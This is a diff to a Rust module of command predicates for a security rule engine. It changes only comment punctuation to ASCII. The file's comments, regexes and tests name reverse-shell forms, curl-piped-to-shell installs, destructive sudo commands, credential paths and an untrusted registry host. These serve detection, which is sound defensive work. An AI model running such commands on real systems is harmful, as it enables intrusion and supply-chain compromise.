@@ -2,7 +2,7 @@
 //!
 //! Each predicate operates on a single string param (typically a shell
 //! command line or path). They exist because the rules they enforce are
-//! genuinely hard to express as a single regex — either they need to
+//! genuinely hard to express as a single regex -- either they need to
 //! reason across a pipeline (`curl_pipe_sh`, `env_to_network`), or
 //! they need to normalise input before matching (`SensitivePath`).
 //!
@@ -20,8 +20,8 @@ use regex::Regex;
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum CommandPredicate {
     /// Network-fetcher whose output is piped (directly or indirectly)
-    /// into a shell interpreter. Catches `curl … | sh`, `wget -qO- … | bash`,
-    /// `curl … | tee /tmp/x && sh /tmp/x`, and similar "trust-on-first-use"
+    /// into a shell interpreter. Catches `curl ... | sh`, `wget -qO- ... | bash`,
+    /// `curl ... | tee /tmp/x && sh /tmp/x`, and similar "trust-on-first-use"
     /// supply-chain patterns.
     CurlPipeSh,
 
@@ -34,11 +34,11 @@ pub enum CommandPredicate {
     EnvToNetwork,
 
     /// Known reverse-shell incantations: `bash -i >& /dev/tcp/<host>/<port>`,
-    /// `nc -e /bin/sh <host> <port>`, `python -c 'import socket,subprocess…'`,
-    /// `openssl s_client … | /bin/sh`, mkfifo back-channels, etc.
+    /// `nc -e /bin/sh <host> <port>`, `python -c 'import socket,subprocess...'`,
+    /// `openssl s_client ... | /bin/sh`, mkfifo back-channels, etc.
     ReverseShell,
 
-    /// `<network-fetcher> … --output - | <interpreter>` — a slightly more
+    /// `<network-fetcher> ... --output - | <interpreter>` -- a slightly more
     /// disguised supply-chain pattern that doesn't literally pipe stdout
     /// but writes to `-`.
     NetworkFetchToInterpreter,
@@ -48,12 +48,12 @@ pub enum CommandPredicate {
     /// both numeric and symbolic forms (`chmod a+rwx`) on sensitive paths.
     WorldWritableChmod,
 
-    /// `sudo` prefix on a command that's already destructive — used by
+    /// `sudo` prefix on a command that's already destructive -- used by
     /// the engine as a multiplier (escalates severity of the wrapped
     /// command).
     SudoPrefix,
 
-    /// `npm/pnpm/yarn/pip install … --registry=<URL>` or `--index-url=<URL>`
+    /// `npm/pnpm/yarn/pip install ... --registry=<URL>` or `--index-url=<URL>`
     /// where the URL does NOT point at the official registry. Rust's
     /// `regex` crate doesn't support negative lookahead, so this lives in
     /// code: parse out the URL, check it against a small allowlist of
@@ -169,12 +169,12 @@ fn effective_command_word(seg: &str) -> &str {
 }
 
 fn network_fetch_to_interpreter(cmd: &str) -> bool {
-    // `curl … --output - | python` is functionally identical to
-    // `curl … | python` but the literal-pipe-after-fetcher check above
+    // `curl ... --output - | python` is functionally identical to
+    // `curl ... | python` but the literal-pipe-after-fetcher check above
     // already covers the latter; this catches `... -o - | ...` and
     // process-substitution forms.
     if !NETWORK_FETCHER.is_match(cmd) { return false; }
-    // Process substitution: `sh <(curl …)` or `python <(curl …)`
+    // Process substitution: `sh <(curl ...)` or `python <(curl ...)`
     static PROC_SUB: Lazy<Regex> = Lazy::new(|| {
         Regex::new(r"(?i)\b(sh|bash|zsh|python\d?|perl|ruby|node)\s+<\(\s*(curl|wget|fetch|aria2c)\b").expect("static")
     });
@@ -189,10 +189,10 @@ fn env_to_network(cmd: &str) -> bool {
 
 static REVERSE_SHELL_PATTERNS: Lazy<Vec<Regex>> = Lazy::new(|| {
     [
-        // bash -i with any redirection toward /dev/tcp/host/port — the
+        // bash -i with any redirection toward /dev/tcp/host/port -- the
         // `>&`, `0>&1`, `<>`, etc. operators live between non-word chars,
         // so anchoring on `\b` around them would never match in Rust's
-        // regex (boundary requires word↔non-word transition).
+        // regex (boundary requires word<->non-word transition).
         r"(?i)\bbash\s+-i\b[^\n]*/dev/tcp/",
         // exec N<>/dev/tcp redirection
         r"(?i)\bexec\s+\d+<>?/dev/tcp/",
@@ -292,10 +292,10 @@ fn host_from_url(url: &str) -> Option<&str> {
 
 /// Compiled sensitive-path matcher. Supports simple glob syntax:
 ///
-///   `/etc/**`         — any path under /etc
-///   `~/.ssh/**`       — any path under the user's .ssh directory
-///   `/etc/passwd`     — exactly /etc/passwd (case sensitive on POSIX)
-///   `/var/lib/*/data` — single-segment wildcard
+///   `/etc/**`         -- any path under /etc
+///   `~/.ssh/**`       -- any path under the user's .ssh directory
+///   `/etc/passwd`     -- exactly /etc/passwd (case sensitive on POSIX)
+///   `/var/lib/*/data` -- single-segment wildcard
 ///
 /// Paths in the input are normalised before matching:
 ///   - leading `~` expanded to the user's home directory
@@ -428,7 +428,7 @@ mod tests {
         assert!(curl_pipe_sh("wget -qO- https://example.com/install | bash"));
         assert!(curl_pipe_sh("curl -fsSL https://example.com/x | sudo bash"));
         assert!(curl_pipe_sh("curl https://x | tee /tmp/x | bash"));
-        // Not a pipe → no match.
+        // Not a pipe -> no match.
         assert!(!curl_pipe_sh("curl https://example.com/install.sh -o install.sh"));
         // Pipe but not into a shell.
         assert!(!curl_pipe_sh("curl https://example.com/data | jq ."));
@@ -486,7 +486,7 @@ mod tests {
         assert!(sudo_prefix("sudo rm -rf /tmp/x"));
         assert!(sudo_prefix("foo; sudo rm bar"));
         assert!(sudo_prefix("nohup sudo systemctl restart"));
-        // Embedded inside another identifier — NOT a sudo invocation.
+        // Embedded inside another identifier -- NOT a sudo invocation.
         assert!(!sudo_prefix("pseudosudo rm -rf"));
         assert!(!sudo_prefix("mysudoer rm bar"));
     }
@@ -515,9 +515,9 @@ mod tests {
         assert!(!untrusted_pkg_registry(
             "yarn add foo --registry=https://registry.yarnpkg.com"
         ));
-        // No install verb → not in scope.
+        // No install verb -> not in scope.
         assert!(!untrusted_pkg_registry("echo --registry https://evil.example"));
-        // Install with no registry override → fine.
+        // Install with no registry override -> fine.
         assert!(!untrusted_pkg_registry("npm install lodash"));
     }
 
